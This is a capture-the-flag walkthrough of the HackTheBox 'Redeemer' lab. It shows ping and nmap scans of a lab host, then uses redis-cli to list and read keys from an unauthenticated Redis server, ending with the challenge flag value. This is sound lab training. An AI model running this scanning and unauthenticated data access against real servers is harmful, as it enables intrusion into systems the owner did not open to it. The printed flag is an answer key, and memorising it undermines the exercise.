---
title: "HackTheBox - Redeemer"
date: 2023-12-25 07:52:00 +0700
categories: [HackTheBox, Starting Point]
tags: [very easy, redis, databases]
image:
    path: /assets/img/htb/Redeemer.png
    alt: Redeemer - HackTheBox
---

[**Redeemer**](https://app.hackthebox.com/starting-point) is one of the Starting Points from [**HackTheBox**](https://app.hackthebox.com/), where in CTF Redeemer we will learn about **Redis (REmote DIctionary Server)**.

## Introduction

- Connect **Redeemer** using **Pwnbox** or **OpenVPN**.
- Spawn machine.

## Enumeration

To check the target connection and port, we can use **Ping** and **Nmap**.

### Ping

After spawn machine, we can start with ping Target IP.

```bash
❯ ping 10.129.150.140

PING 10.129.150.140 (10.129.150.140) 56(84) bytes of data.
64 bytes from 10.129.150.140: icmp_seq=1 ttl=63 time=234 ms
64 bytes from 10.129.150.140: icmp_seq=2 ttl=63 time=275 ms
64 bytes from 10.129.150.140: icmp_seq=3 ttl=63 time=296 ms
64 bytes from 10.129.150.140: icmp_seq=4 ttl=63 time=319 ms

--- 10.129.150.140 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 234.354/280.959/318.905/31.135 ms
```

### Nmap

Scan ports using `nmap`, `-sV` to display port version info, `-T4` to speed up scanning (the higher the faster [0-5]), `-p-` to scan all ports without exception, and `-Pn` to treat all hosts as online.

```bash
❯ nmap -sV -T4 -p- -Pn 10.129.150.140

Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-25 08:23 WIB
Warning: 10.129.150.140 giving up on port because retransmission cap hit (6).
Nmap scan report for JSN.JaringanKU (10.129.150.140)
Host is up (0.21s latency).
Not shown: 64934 closed tcp ports (conn-refused), 600 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1458.17 seconds
```

You can see, the open port is 6379/tcp which is a Redis service. We can connect to the Redis service using `redis-cli`. If you don't have it, please download it first.

## Foothold

It's time to connect to the Redis service with `redis-cli`. If you don't know the command, use `--help` to display help. Use `-h` to connect to the destination host.

### Redis

To display all databases, we can use the command `keys *`, and to display the contents of the database use `get <key>`.

```bash
❯ redis-cli -h 10.129.150.140

10.129.150.140:6379> keys *
1) "stor"
2) "numb"
3) "flag"
4) "temp"

10.129.150.140:6379> get stor
"e80d635f95686148284526e1980740f8"

10.129.150.140:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"

10.129.150.140:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"

10.129.150.140:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```